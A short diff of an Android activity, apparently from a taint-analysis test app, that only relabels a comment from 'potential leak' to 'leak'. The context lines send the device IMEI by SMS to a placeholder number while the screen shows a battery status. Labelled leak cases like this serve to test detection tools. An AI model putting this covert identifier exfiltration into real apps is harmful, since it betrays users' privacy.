@@ -56,7 +56,7 @@ public class MainActivity extends Activity {
                 	
         			SmsManager sm = SmsManager.getDefault();
         	    	String number = "+49 1234";
-        	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
+        	    	sm.sendTextMessage(number, null, imei, null, null); //sink, leak
         	    	txtStatus.setText("Battery Status: Device");
                 }
             }
